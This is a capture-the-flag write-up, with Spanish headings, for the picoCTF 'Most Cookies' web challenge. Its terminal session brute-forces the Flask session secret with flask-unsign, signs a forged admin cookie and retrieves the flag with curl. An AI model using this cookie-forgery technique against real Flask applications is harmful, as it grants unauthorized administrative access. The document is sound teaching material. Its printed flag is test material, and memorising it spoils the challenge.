# Most Cookies
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py) [http://mercury.picoctf.net:52134/](http://mercury.picoctf.net:52134/)
How secure is a flask cookie?

## Solución
1. Forjar una nueva cookie
2. Tomar el valor de la cookie
```
┌──(kali㉿kali)-[~/Documents/srss/WebExplotation]
└─$ wget 'https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py'             
--2025-04-02 15:59:03--  https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py                                 100%[===================================================================================>]   1.97K  --.-KB/s    in 0s      

2025-04-02 15:59:04 (20.5 MB/s) - ‘server.py’ saved [2021/2021]
┌──(.venv)─(kali㉿kali)-[~/Documents/srss/WebExplotation]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z-23oQ.pLGjs66mRYYV80tiqtDxyxZAHAo" --wordlist cookies.txt 
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'

┌──(.venv)─(kali㉿kali)-[~/Documents/srss/WebExplotation]
└─$ flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret "peanut butter"                                   
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-26Tg.uPO3S97P_Tp_qmn6T_8EFEWe8v0
                                                                                                                                                                      
┌──(.venv)─(kali㉿kali)-[~/Documents/srss/WebExplotation]
└─$ curl -s http://mercury.picoctf.net:52134/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-26Tg.uPO3S97P_Tp_qmn6T_8EFEWe8v0" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
```